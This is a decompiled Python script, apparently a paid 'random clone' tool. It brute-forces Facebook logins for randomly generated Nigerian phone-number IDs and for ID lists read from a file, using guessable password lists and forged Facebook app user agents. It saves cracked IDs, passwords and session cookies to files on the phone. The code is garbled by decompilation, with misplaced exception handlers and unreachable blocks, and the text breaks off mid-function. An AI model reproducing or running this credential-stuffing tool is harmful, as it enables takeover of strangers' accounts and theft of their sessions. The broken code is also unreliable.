# Decode By Error x Ethan 

# irreducible cflow, using cdg fallback
global twf
global oks
global cps
global loop
import os
import requests
import json
import time
import re
import random
import sys
import uuid
import mechanize
import string
import subprocess
import bs4
import urllib3
import rich
import base64
import platform
import httplib2
import arrow
from string import *
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
from datetime import datetime
                required_modules = ['sys', 'requests', 'bs4', 'tred', 'platform', 'httplib2', 'arrow']
                for module in required_modules:
                    if module not in dir():
                        print(f'>> CRITICAL ERROR: {module} module not imported!')
                        exit()
                def getKey():
                    myid = str(os.getuid())
                    myid = myid.upper()[::(-1)]
                    n = re.findall('(\\d\\d)', myid)
                    plat = platform.version()[2:][:8][::(-1)].upper() + platform.release()[3:][::(-1)].upper() + platform.version()[:2]
                    xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
                    return 'AXT-' + myid + xp
                def line():
                    print('----------------------------------------------')
                def subscription(message):
                    clear()
                    key = getKey()
                    print('[1;97m [•] YOUR KEY   :  ' + key)
                    line()
                    print('[1;97m [•] THIS TOOL IS PAID')
                    print('[1;97m [•] YOU NEED  APPROVAL')
                    line()
                    xh = input('[1;97m [•] PRESS ENTER FOR SEND YOUR KEY')
                    if xh in ['Trail', 'trail']:
                        trk.append('Trail')
                        On()
                    clear()
                    uname = input('[1;97m [•] ENTER YOUR NAME : ')
                    tsk = 'Hi Mr AXT! I Need Approval For Your Paid Tool So Please Approve My Key-:)\n\nName : ' + uname + ' \nKey : ' + key
                    subprocess.check_output(['am', 'start', 'https://api.whatsapp.com/send?phone=+2348106877347&text=' + tsk])
                    time.sleep(2)
                    On()
                trk = []
                def On():
                    try:
                        clear()
                        if 'Trail' in trk:
                            print(' Put Your Trail Key Bellow! ')
                            line()
                            key = input(' Put Key: ')
                        else:
                            key = getKey()
                        headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36'}
                        params = {'key': key, 'device': platform.platform()}
                        url = 'https://itsngr.serv00.net/checkpzh.php'
                        http_obj = httplib2.Http()
                        response, content = http_obj.request(uri=url + '?' + '&'.join([f'{k}={v}' for k, v in params.items()]), method='GET', headers=headers)
                        response = content.decode('utf-8')
                        if 'error' in response:
                            if 'Key has expired' in response:
                                subscription('[1;97m [•] Your Key Has Been Expired! ')
                            else:
                                subscription('[1;97m [•] You\'re Not Premium User ')
                        else:
                            if 'user' in response:
                                result = json.loads(response)
                                try:
                                    name = result['name']
                                except:
                                    name = '-'
                                user = result['user']
                                exp = result['expired']
                                join = result['joined']
                                date_today = arrow.now().format('YYYY-MM-DD')
                                a = arrow.get(date_today)
                                b = arrow.get(exp)
                                delta = (b - a).days
                                ___A_X_T___()
                            else:
                                On()
                    except Exception as e:
                        print(f'[1;97m [•] Error: {e}')
                        time.sleep(1)
                        exit()
                loop = 0
                oks = []
                cps = []
                twf = []
                pcp = []
                id = []
                tokenku = []
                user = []
                plist = []
                pookie = []
                ugen = []
                show_cookies = []
                def generate_wv_ua():
                    brands = {'Samsung': ['SM-A146P', 'SM-M336B', 'SM-A525F', 'SM-G996B'], 'Infinix': ['Infinix X688B', 'Infinix X665C', 'Infinix X683', 'Infinix X671'], 'Tecno': ['TECNO KG5p', 'TECNO BD4j', 'TECNO CH9n', 'TECNO KF8'], 'Xiaomi': ['Redmi Note 11', 'Redmi Note 12', 'Redmi 10C', 'POCO M4 Pro'], 'Oppo': ['CPH2127', 'CPH2389', 'CPH2457', 'CPH2239']}
                    carriers = ['MTN', 'Airtel', 'Glo', '9mobile']
                    android_versions = ['12', '13', '14']
                    chrome_version = '134.0.6998.170'
                    brand = random.choice(list(brands.keys()))
                    model = random.choice(brands[brand])
                    carrier = random.choice(carriers)
                    android_version = random.choice(android_versions)
                    fbbv = random.randint(3412000, 3418000)
                    fbrv = random.randint(812345678, 912345682)
                    width = random.choice([720, 1080])
                    height = random.choice([1600, 2400])
                    density = round(random.uniform(2.5, 3.0), 2)
                    ua = f'Mozilla/5.0 (Linux; Android {android_version}; {model} Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome_version} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/506.1.0.74.27;IABMV/1;] [FBAN/FB4A;FBAV/506.1.0.74.27;FBBV/{fbbv};FBRV/{fbrv};FBPN/com.facebook.katana;FBLC/en_NG;FBCR/{carrier};FBMF/{brand};FBBD/{brand};FBDV/{model};FBSV/{android_version};FBCA/arm64-v8a:armeabi-v7a;FBDM/{density={density},width={width},height={height}};]'
                    return ua
                def get_uaa():
                    return generate_wv_ua()
                def ____U_A_1____():
                    facebook_version = f'{random.randint(100, 450)}.0.0.{random.randint(1, 40)}.{random.randint(10, 150)}'
                    fb_ver_code = str(random.randint(10000000, 66666666))
                    fbrv_ver_code = str(random.randint(0, 999999999))
                    fblc_code = random.choice(['en_GB', 'en_US', 'es_LA', 'fr_FR', 'ar_AR', 'sv_SE', 'pt_BR', 'it_IT', 'nl_NL', 'ru_RU', 'ro_RO', 'ko_KR', 'hr_HR', 'en_Qaau_US', 'cs_CZ', 'de_DE', 'mk_MK', 'zh_HK', 'he_IL', 'uk_UA', 'lv_LV', 'el_GR', 'zh_TW', 'nb_NO', 'en_US AT-T', 'en_NG'])
                    tecno_model = random.choice(['Tecno Camon 17', 'Tecno Spark 7', 'Tecno Phantom X', 'Tecno Pouvoir 4'])
                    infinix_model = random.choice(['Infinix Hot 10', 'Infinix Zero 8', 'Infinix Note 7', 'Infinix Smart 5'])
                    itel_model = random.choice(['itel A56', 'itel P36', 'itel S16', 'itel Vision 1'])
                    doogee_model = random.choice(['Doogee X9 Pro', 'Doogee N30', 'Doogee S88 Plus', 'Doogee X97 Pro'])
                    blu_model = random.choice(['BLU R1 HD', 'F92 E 5G', 'Advance A5', 'Grand M3'])
                    android_version = f'{random.randint(4, 13)}.{random.randint(0, 5)}.{random.randint(1, 5)}'
                    fbdm_code = '{density=2.0,width=720,height=1440}'
                    sim_name = random.choices(['MTN', 'Airtel', 'Glo', '9mobile', 'Vodafone', 'Orange', 'T-Mobile', 'AT-T', 'Claro'], weights=[30, 30, 25, 20, 5, 5, 5, 5, 5], k=1)[0]
                    brand = random.choices(['TECNO', 'Infinix', 'iTel', 'DOOGEE', 'Blu', 'Samsung', 'Huawei'], weights=[30, 25, 20, 10, 5, 5, 5], k=1)[0]
                    model = random.choice([tecno_model, infinix_model, itel_model, doogee_model, blu_model])
                    uaa1 = '[FBAN/FB4A;FBAV/' + str(random.randint(11, 99)) + '.0.0.' + str(random.randint(1111, 9999)) + ';FBBV/' + str(random.randint(1111111, 9999999)) + ';[FBAN/FB4A;FBAV/' + facebook_version + ';FBBV/' + fb_ver_code + ';FBRV/' + fbrv_ver_code + ';FBPN/com.facebook.katana;FBLC/' + fblc_code + ';FBMF/' + brand + ';FBBD/' + brand + ';FBDV/' + model + ';FBSV/' + android_version + ';FBCA/armeabi-v8a:armeabi;FBDM/' + fbdm_code + ';FB_FW/1;]'
                    uaa2 = '[FBAN/FB4A;FBAV/' + str(random.randint(10, 100)) + '.0.0.' + str(random.randint(1, 8)) + '.' + str(random.randint(40, 150)) + ';FBBV/' + str(random.randint(4100000, 4999999)) + ';[FBAN/FB4A;FBAV/' + facebook_version + ';FBBV/' + fb_ver_code + ';FBDM/' + fbdm_code + ';FBLC/' + fblc_code + ';FBRV/' + fbrv_ver_code + ';FBCR/' + sim_name + ';FBMF/' + brand + ';FBBD/' + brand + ';FBPN/com.facebook.katana;FBDV/' + model + ';FBSV/' + android_version + ';FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                    return random.choice([uaa1, uaa2])
                def ____U_A_2____():
                    facebook_version = f'{random.randint(100, 450)}.0.0.{random.randint(1, 40)}.{random.randint(10, 150)}'
                    fb_ver_code = str(random.randint(10000000, 66666666))
                    fbrv_ver_code = str(random.randint(0, 999999999))
                    fblc_code = random.choice(['en_GB', 'en_US', 'es_LA', 'fr_FR', 'ar_AR', 'sv_SE', 'pt_BR', 'it_IT', 'nl_NL', 'ru_RU', 'ro_RO', 'ko_KR', 'hr_HR', 'en_Qaau_US', 'cs_CZ', 'de_DE', 'mk_MK', 'zh_HK', 'he_IL', 'uk_UA', 'lv_LV', 'el_GR', 'zh_TW', 'nb_NO', 'en_US AT-T', 'en_NG'])
                    tecno_model = random.choice(['Tecno Camon 17', 'Tecno Spark 7', 'Tecno Phantom X', 'Tecno Pouvoir 4'])
                    infinix_model = random.choice(['Infinix Hot 10', 'Infinix Zero 8', 'Infinix Note 7', 'Infinix Smart 5'])
                    itel_model = random.choice(['itel A56', 'itel P36', 'itel S16', 'itel Vision 1'])
                    oppo_model = random.choice(['CPH1837', 'CPH1901', 'CPH1931', 'CPH1959'])
                    realme_model = random.choice(['RMX1945', 'RMX2170', 'RMX2155', 'RMX3363'])
                    android_version = f'{random.randint(4, 13)}.{random.randint(0, 5)}.{random.randint(1, 5)}'
                    fbdm_code = '{density=2.0,width=720,height=1440}'
                    sim_name = random.choices(['MTN', 'Airtel', 'Glo', '9mobile', 'Vodafone', 'Orange', 'T-Mobile', 'AT-T', 'Claro'], weights=[30, 30, 25, 20, 5, 5, 5, 5, 5], k=1)[0]
                    brand = random.choices(['TECNO', 'Infinix', 'iTel', 'OPPO', 'Realme', 'Samsung', 'Huawei'], weights=[30, 25, 20, 10, 10, 5, 5], k=1)[0]
                    model = random.choice([tecno_model, infinix_model, itel_model, oppo_model, realme_model])
                    uaa1 = '[FBAN/FB4A;FBAV/' + str(random.randint(11, 99)) + '.0.0.' + str(random.randint(1111, 9999)) + ';FBBV/' + str(random.randint(1111111, 9999999)) + ';[FBAN/FB4A;FBAV/' + facebook_version + ';FBBV/' + fb_ver_code + ';FBRV/' + fbrv_ver_code + ';FBPN/com.facebook.katana;FBLC/' + fblc_code + ';FBMF/' + brand + ';FBBD/' + brand + ';FBDV/' + model + ';FBSV/' + android_version + ';FBCA/armeabi-v8a:armeabi;FBDM/' + fbdm_code + ';FB_FW/1;]'
                    uaa2 = '[FBAN/FB4A;FBAV/' + str(random.randint(10, 100)) + '.0.0.' + str(random.randint(1, 8)) + '.' + str(random.randint(40, 150)) + ';FBBV/' + str(random.randint(4100000, 4999999)) + ';[FBAN/FB4A;FBAV/' + facebook_version + ';FBBV/' + fb_ver_code + ';FBDM/' + fbdm_code + ';FBLC/' + fblc_code + ';FBRV/' + fbrv_ver_code + ';FBCR/' + sim_name + ';FBMF/' + brand + ';FBBD/' + brand + ';FBPN/com.facebook.katana;FBDV/' + model + ';FBSV/' + android_version + ';FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                    return random.choice([uaa1, uaa2])
                def tutulx(fx):
                    if len(fx) == 15:
                        if fx[:10] in ['1000000000']:
                            tutulxz = '2009'
                            return tutulxz
                        else:
                            if fx[:9] in ['100000000']:
                                tutulxz = '2009'
                                return tutulxz
                            else:
                                if fx[:8] in ['10000000']:
                                    tutulxz = '2009'
                                    return tutulxz
                                else:
                                    if fx[:7] in ['1000000', '1000001', '1000002', '1000003', '1000004', '1000005']:
                                        tutulxz = '2009'
                                        return tutulxz
                                    else:
                                        if fx[:7] in ['1000006', '1000007', '1000008', '1000009']:
                                            tutulxz = '2010'
                                            return tutulxz
                                        else:
                                            if fx[:6] in ['100001']:
                                                tutulxz = '2010/2011'
                                                return tutulxz
                                            else:
                                                if fx[:6] in ['100002', '100003']:
                                                    tutulxz = '2011/2012'
                                                    return tutulxz
                                                else:
                                                    if fx[:6] in ['100004']:
                                                        tutulxz = '2012/2013'
                                                        return tutulxz
                                                    else:
                                                        if fx[:6] in ['100005', '100006']:
                                                            tutulxz = '2013/2014'
                                                            return tutulxz
                                                        else:
                                                            if fx[:6] in ['100007', '100008']:
                                                                tutulxz = '2014/2015'
                                                                return tutulxz
                                                            else:
                                                                if fx[:6] in ['100009']:
                                                                    tutulxz = '2015'
                                                                    return tutulxz
                                                                else:
                                                                    if fx[:5] in ['10001']:
                                                                        tutulxz = '2015/2016'
                                                                        return tutulxz
                                                                    else:
                                                                        if fx[:5] in ['10002']:
                                                                            tutulxz = '2016/2017'
                                                                            return tutulxz
                                                                        else:
                                                                            if fx[:5] in ['10003']:
                                                                                tutulxz = '2018/2019'
                                                                                return tutulxz
                                                                            else:
                                                                                if fx[:5] in ['10004']:
                                                                                    tutulxz = '2019'
                                                                                    return tutulxz
                                                                                else:
                                                                                    if fx[:5] in ['10005']:
                                                                                        tutulxz = '2020'
                                                                                        return tutulxz
                                                                                    else:
                                                                                        if fx[:5] in ['10006', '10007', '10008']:
                                                                                            tutulxz = '2021/2022'
                                                                                            return tutulxz
                                                                                        else:
                                                                                            tutulxz = '2023'
                                                                                            return tutulxz
                    else:
                        if len(fx) in [9, 10]:
                            tutulxz = '2008/2009'
                            return tutulxz
                        else:
                            if len(fx) == 8:
                                tutulxz = '2007/2008'
                                return tutulxz
                            else:
                                if len(fx) == 7:
                                    tutulxz = '2006/2007'
                                    return tutulxz
                                else:
                                    tutulxz = '2023/2024'
                                    return tutulxz
                sys.stdout.write(']2; AXT\a')
                gx = '[1;32m'
                wx = '[1;97m'
                rx = '[38;5;160m'
                cx = '[1;96m'
                yx = '[1;93m'
                bx = '[1;90m'
                xd = f'{bx}[{wx}~{bx}]{gx}'
                xd1 = f'{bx}[{wx}1{bx}]{gx}'
                xd2 = f'{bx}[{wx}2{bx}]{gx}'
                xd3 = f'{bx}[{wx}3{bx}]{gx}'
                xd4 = f'{bx}[{wx}4{bx}]{gx}'
                xd5 = f'{bx}[{wx}5{bx}]{gx}'
                xd6 = f'{bx}[{wx}6{bx}]{gx}'
                xd7 = f'{bx}[{wx}7{bx}]{gx}'
                xd8 = f'{bx}[{wx}8{bx}]{gx}'
                xd9 = f'{bx}[{wx}9{bx}]{gx}'
                xd10 = f'{bx}[{wx}10{bx}]{gx}'
                xd0 = f'{bx}[{wx}0{bx}]{gx}'
                xdx = f'{bx}[{wx}?{bx}]{gx}'
                os.system('xdg-open https://chat.whatsapp.com/Lje6yDaKThu7OEQrfMTbps')
                logo = f"\n\n──────────────────────────────────────────────────\n─██████████████─████████──████████─██████████████─\n─██▒▒▒▒▒▒▒▒▒▒██─██▒▒▒▒██──██▒▒▒▒██─██▒▒▒▒▒▒▒▒▒▒██─\n─██▒▒██████▒▒██─████▒▒██──██▒▒████─██████▒▒██████─\n─██▒▒██──██▒▒██───██▒▒▒▒██▒▒▒▒██───────██▒▒██─────\n─██▒▒██████▒▒██───████▒▒▒▒▒▒████───────██▒▒██─────\n─██▒▒▒▒▒▒▒▒▒▒██─────██▒▒▒▒▒▒██─────────██▒▒██─────\n─██▒▒██████▒▒██───████▒▒▒▒▒▒████───────██▒▒██─────\n─██▒▒██──██▒▒██───██▒▒▒▒██▒▒▒▒██───────██▒▒██─────\n─██▒▒██──██▒▒██─████▒▒██──██▒▒████─────██▒▒██─────\n─██▒▒██──██▒▒██─██▒▒▒▒██──██▒▒▒▒██─────██▒▒██─────\n─██████──██████─████████──████████─────██████─────\n──────────────────────────────────────────────────\n{wx}{'-----------------------------------------------'}\n       {gx}TOOLS {bx}|{wx}RANDOM {gx}CLONE\n{wx}{'-----------------------------------------------'}"
                def clear():
                    os.system('clear')
                    print(logo)
                def linex():
                    print(f"{wx}{'-----------------------------------------------'}")
                def ___A_X_T___():
                    clear()
                    print(f'{xd1} START RANDOM {wx}CLONE ')
                    print(f'{xd2} START FILE CLONING ')
                    print(f'{xd0} EXIT ')
                    linex()
                    ___O_P___ = input(f'{xdx} SELECTION {bx}:{wx} ')
                    if ___O_P___ in ['1']:
                        ____R_A_N_D_O_M____()
                    else:
                        if ___O_P___ in ['2']:
                            ____F_I_L_E____()
                        else:
                            if ___O_P___ in ['0']:
                                exit()
                            else:
                                linex()
                                print(f'{xd}{rx} WRONG OPTION SELECTION ')
                                time.sleep(3)
                                ___G_E_N___()
                country_map = {'1': 'NIGERIA'}
                def ____R_A_N_D_O_M____():
                    clear()
                    print(f'{xd1} START NIGERIA RANDOM CLONING ')
                    linex()
                    ___O_P_T_I_O_N___ = input(f'{xdx} SELECTION {bx}:{wx} ')
                    if ___O_P_T_I_O_N___ in country_map:
                        pookie.append(___O_P_T_I_O_N___)
                        ___A_L_L_C_O_U_N_T_Y___(___O_P_T_I_O_N___)
                    else:
                        linex()
                        print(f'{xd}{rx} WRONG OPTION SELECTION ')
                        time.sleep(3)
                        ____R_A_N_D_O_M____()
                def ___A_L_L_C_O_U_N_T_Y___(___O_P_T_I_O_N___):
                    clear()
                    if '1' in pookie:
                        print(f'{xd} EXAMPLE {bx}:{gx} 070 {bx}|{gx} 080 {bx}|{gx} 081 {bx}|{gx} 091 ')
                        linex()
                    else:
                        if '2' in pookie:
                            print(f'{xd} EXAMPLE {bx}:{gx} 070 {bx}|{gx} 080 {bx}|{gx} 081 {bx}|{gx} 091 ')
                            linex()
                    code = input(f'{xdx} ENTER SIM CODE {bx}:{wx} ')
                    linex()
                    print(f'{xd} EXAMPLE {bx}:{gx} 3000 {bx}|{gx} 5000 {bx}|{gx} 10000 {bx}|{gx} 99999 ')
                    linex()
                    limit = int(input(f'{xdx} ENTER LIMIT {bx}:{wx} '))
                    clear()
                    print(f'{xd1} METHOD {wx}~{gx} M1')
                    linex()
                    ___M_T_D___ = input(f'{xd} ENTER METHOD {bx}:{wx} ')
                    clear()
                    ___S_P___ = input(f'{xd} DO YOU WENT SHOW CP UID {bx}:{wx} {wx}({gx}y{bx}/{rx}n{wx}) ')
                    if ___S_P___ in ['y', 'Y', 'yes', 'Yes', '1']:
                        pcp.append('y')
                    else:
                        pcp.append('n')
                    clear()
                    ___C_O_O_K_I_E_S___ = input(f'{xd} DO YOU WANT SHOW COOKIES {bx}:{wx} {wx}({gx}y{bx}/{rx}n{wx}) ')
                    if ___C_O_O_K_I_E_S___ in ['y', 'Y', 'yes', 'Yes', '1']:
                        show_cookies.append('y')
                    else:
                        show_cookies.append('n')
                    for nmbr in range(int(limit)):
                        if '1' in pookie:
                            numberxx = ''.join((random.choice(string.digits) for _ in range(8)))
                            user.append(numberxx)
                        else:
                            if '2' in pookie:
                                numberxx = ''.join((random.choice(string.digits) for _ in range(8)))
                                user.append(numberxx)
                    with tred(max_workers=40) as ___P_R_O___:
                        clear()
                        tl = str(len(user))
                        country_name = country_map.get(___O_P_T_I_O_N___, 'UNKNOWN')
                        print(''.join(f'{xd} OPERATOR{bx}|{gx}LIMIT{bx}|{gx}METHOD {bx}:{wx} {code}{bx}|{wx}M{___M_T_D___}\n{xd} CLONING COUNTRY {bx}:{wx} {country_name}))
                        print(f'{xd} FLIGHT MODE {wx}ON{bx}|{wx}OFF{gx} EVERY {wx}1{gx} MINUTES ')
                        linex()
                        for love in user:
                            ids = code + love
                            if '1' in pookie:
                                passlist = [ids, love, ids[:8], ids[:7], ids[:9], ids[:11], ids[:6], ids[:10], '1234567', '123456789', '123456']
                            else:
                                if '2' in pookie:
                                    passlist = [ids, love, ids[:8], ids[:7], ids[:9], ids[:11], ids[:6], '500500', '200200', '123456', '123123', '1234567']
                            if ___M_T_D___ in ['1']:
                                ___P_R_O___.submit(____M_E_T_H_O_D_A____, ids, passlist, tl)
                            else:
                                if ___M_T_D___ in ['2']:
                                    ___P_R_O___.submit(____M_E_T_H_O_D_B____, ids, passlist, tl)
                    print(f"\n{wx}{'-----------------------------------------------'}")
                    print(f'{xd} THE PROCESS HAS COMPLETED')
                    print(f'{xd} TOTAL OK IDS {bx}:{gx} {len(oks)}')
                    print(f'{xd} TOTAL CP IDS {bx}:[38;5;205m {len(cps)}')
                    print(f"{wx}{'-----------------------------------------------'}")
                    exit()
                def ____M_E_T_H_O_D_A____(ids, passlist, tl):
                    # irreducible cflow, using cdg fallback
                    global loop
                    xp = f'{bx}[{gx}MR{bx}]{gx}'
                    sys.stdout.write(f'\r\r{xp}-[1;90m[[1;32mAXT[1;90m] [1;37m%s[1;90m|[1;37mOK:-[1;32m%s[1;90m|[1;37mCP:-[38;5;205m%s[1;90m|[1;37m2FA:-[38;5;214m%s ' % (loop, len(oks), len(cps), len(twf)))
                    sys.stdout.flush()
                    ewe = requests.Session()
                    ua = get_uaa()
                    try:
                        link = ewe.get('https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text
                        m_ts = re.search('name=\"m_ts\" value=\"(.*?)\"', str(link)).group(1)
                        li_val = re.search('name=\"li\" value=\"(.*?)\"', str(link)).group(1)
                        jazoest = re.search('name=\"jazoest\" value=\"(\\d+)\"', str(link)).group(1)
                        lsd_val = re.search('name=\"lsd\" value=\"(.*?)\"', str(link)).group(1)
                    except:
                        return None
                    for pas in passlist:
                        pass
                    data = {'m_ts': m_ts, 'li': li_val, 'try_number': 0, 'unrecognized_tries': 0, 'email': ids, 'prefill_contact_point': ids, 'prefill_source': 'browser_dropdown', 'prefill_type': 'contact_point', 'first_prefill_source': 'browser_dropdown', 'first_prefill_type': 'contact_point', 'had_cp_prefilled': True, 'had_password_prefilled': False, 'is_smart_lock': False, 'bi_xrwh': 0, 'encpass': '#PWD_BROWSER:0:{}:{}'.format(str(time.time()).split('.')[0], pas), 'bi_wvdp': '{\"hwc\":true,\"hwcr\":false,\"has_dnt\":true,\"has_standalone\":false,\"wnd_toStr_toStr\":\"function toString() { [native code] }\",\"hasPerm\":true,\"permission_query_toString\":\"function query() { [native code] }\",\"permission_query_toString_toString\":\"function toString() { [native code] }\",\"has_seWo\":true,\"has_meDe\":true,\"has_creds\":true,\"has_hwi_bt\":false,\"has_agjsi\":false,\"iframeProto\":\"function get contentWindow() { [native code] }\",\"remap\":false,\"iframeData\":{\"hwc\":true,\"hwcr\":false,\"has_dnt\":true,\"has_standalone\":false,\"wnd_toStr_toStr\":\"function toString() { [native code] }\",\"hasPerm\":true,\"permission_query_toString\":\"function query() { [native code] }\",\"permission_query_toString_toString\":\"function toString() { [native code] }\",\"has_seWo\":true,\"has_meDe\":true,\"has_creds\":true,\"has_hwi_bt\":false,\"has_agjsi\":false}}', 'jazoest': jazoest, 'lsd': lsd_val}
                    headers = {'Host': 'touch.facebook.com', 'content-length': str(len(data)), 'sec-ch-ua': '\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"{}\", \"Google Chrome\";v=\"{}\"'.format(re.search('Chrome/(\\d+)', str(ua)).group(1), re.search('Chrome/(\\d+)', str(ua)).group(1)), 'sec-ch-ua-mobile': '?1', 'user-agent': ua, 'x-response-format': 'JSONStream', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-lsd': lsd_val, 'viewport-width': '360', 'x-requested-with': 'XMLHttpRequest', 'x-asbd-id': '129477', 'dpr': '2', 'sec-ch-prefers-color-scheme': 'light', 'accept': '*/*', 'origin': 'https://touch.facebook.com', 'sec-fetch-site': 'same-origin', 'cors': {'sec-fetch-mode': 'empty', 'sec-fetch-dest': 'https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8', 'referer': 'gzip, deflate, br', 'accept-encoding': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}}
                    response = ewe.post('https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100', data=data, headers=headers, allow_redirects=False)
                    if 'checkpoint' in ewe.cookies.get_dict():
                        pass
                    uid = ewe.cookies.get_dict()['checkpoint'].split('3A')[1].split('%')[0]
                    if 'y' in pcp:
                        year = tutulx(str(uid))
                        print(f'\r\r[1;90m[[38;5;205mAXT-CP[1;90m][38;5;205m {uid} | {pas}[1;97m [1;90m•> [1;92m{year}')
                        os.system('espeak -a 300 \"Cp\"')
                    open('/sdcard/AXT-RNDM-CP.txt', 'a').write(str(uid) + '|' + pas + '\n')
                    cps.append(str(uid))
                    break
                    if 'c_user' in ewe.cookies.get_dict():
                        pass
                    kuki = ';'.join(['%s=%s' % (key, value) for key, value in ewe.cookies.get_dict().items()])
                    uid = re.findall('c_user=(.*);xs', kuki)[0]
                    year = tutulx(str(uid))
                    print(f'\r\r[1;90m[[1;32mAXT-OK[1;90m][1;32m {uid} | {pas}[1;97m [1;90m•> [1;92m{year}')
                    if 'y' in show_cookies:
                        print('\r\r[1;90m[💥[1;90m][1;37m ' + kuki)
                        print('')
                    os.system('espeak -a 300 \"AXT,  Ok,  id\"')
                    open('/sdcard/AXT-RNDM-OK.txt', 'a').write(str(uid) + '|' + pas + '|' + kuki + '\n')
                    oks.append(str(uid))
                    break
                    loop += 1
                    except requests.exceptions.ConnectionError:
                        pass
                    time.sleep(15)
                def ____F_I_L_E____():
                    clear()
                    print(f'{xd} EXAMPLE {bx}:{gx} /sdcard/filename.txt ')
                    linex()
                    filepro = input(f'{xd} ENTER FILE NAME {bx}:{wx} ')
                    try:
                        fo = open(filepro, 'r').read().splitlines()
                    except FileNotFoundError:
                        linex()
                        print(f'{xd}{rx} FILE NOT FOUND ')
                        time.sleep(3)
                        ____F_I_L_E____()
                    clear()
                    print(f'{xd1} METHOD {wx}~{gx} M1')
                    print(f'{xd2} METHOD {wx}~{gx} M2')
                    linex()
                    ___M_E_T_H_O_D___ = input(f'{xd} ENTER METHOD {bx}:{wx} ')
                    try:
                        clear()
                        print(f'{xd} EXAMPLE BD {bx}:{gx} 10{bx}|{gx}15{bx}|{gx}20{bx}|{gx}25')
                        print(f'{xd} EXAMPLE OTHERS {bx}:{gx} 5{bx}|{gx}10{bx}|{gx}15{bx}|{gx}20')
                        linex()
                        ps_limit = int(input(f'{xdx} PASSWORDS ADD LIMIT {bx}:{wx} '))
                    except:
                        ps_limit = 5
                    clear()
                    print(f'{xd} EXAMPLE {bx}:{gx} firstlast {bx}|{gx} first123 {bx}|{gx} first@@ ')
                    linex()
                    for i in range(ps_limit):
                        plist.append(input(f'{xd} ENTER PASSWORD NO {wx}{i + 1} {bx}:{wx} '))
                    clear()
                    ___C_P___ = input(f'{xd} DO YOU WENT SHOW CP UID {bx}:{wx} ')
                    if ___C_P___ in ['y', 'Y', 'yes', 'Yes', '1']:
                        pcp.append('y')
                    else:
                        pcp.append('n')
                    with tred(max_workers=30) as ___H_U_B___:
                        clear()
                        total_ids = str(len(fo))
                        print(f'{xd} TOTAL UID{bx}|{gx}METHOD {bx}:{wx} {total_ids}{bx}|{wx}M{___M_E_T_H_O_D___} ')
                        print(f'{xd} FLIGHT MODE {wx}ON{bx}|{wx}OFF{gx} EVERY {wx}2{gx} MINUTES ')
                        linex()
                        for user in fo:
                            ids, names = user.split('|')
                            passlist = plist
                            if ___M_E_T_H_O_D___ in ['1']:
                                ___H_U_B___.submit(___M_T_H_D_1___, ids, names, passlist)
                            else:
                                if ___M_E_T_H_O_D___ in ['2']:
                                    ___H_U_B___.submit(___M_T_H_D_2___, ids, names, passlist)
                    print(f"\n{wx}{'-----------------------------------------------'}")
                    print(f'{xd} THE PROCESS HAS COMPLETED')
                    print(f'{xd} TOTAL OK IDS {bx}:{gx} {len(oks)}')
                    print(f'{xd} TOTAL CP IDS {bx}:[38;5;205m {len(cps)}')
                    print(f"{wx}{'-----------------------------------------------'}")
                    exit()
                def ___M_T_H_D_1___(ids, names, passlist):
                    global loop
                    try:
                        xp = f'{bx}[{gx}MR{bx}]{gx}'
                        sys.stdout.write(f'\r\r{xp}-[1;90m[[1;32mAXT[1;90m] [1;37m%s[1;90m|[1;37mOK:-[1;32m%s ' % (loop, len(oks)))
                        sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                            ln = names.split(' ')[1]
                        except:
                            ln = fn
                        for pw in passlist:
                            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
                            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                            random_seed = random.Random()
                            data = {'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'cpl': 'true', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'device_based_login_password', 'error_detail_type': 'button_with_disabled', 'source': 'device_based_login', 'email': ids, 'password': pas, 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'generate_session_cookies': '1', 'meta_inf_fbmeta': '', 'advertiser_id': str(uuid.uuid4()), 'currently_logged_in_userid': '0', 'locale': 'en_US', 'client_country_code': 'US', 'auth.login': {'method': 'authenticate', 'fb_api_req_friendly_name': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 'fb_api_caller_class': '882a8490361da98702bf97a021ddc14d'}}
                            headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'User-Agent': ____U_A_2____(), 'X-FB-Net-HNI': '45204', 'X-FB-SIM-HNI': '45201', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'Accept-Encoding': 'gzip, deflate', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62', 'Connection': 'Keep-Alive'}
                            url = 'https://b-graph.facebook.com/auth/login'
                            po = requests.post(url, data=data, headers=headers).json()
                            if 'session_key' in po:
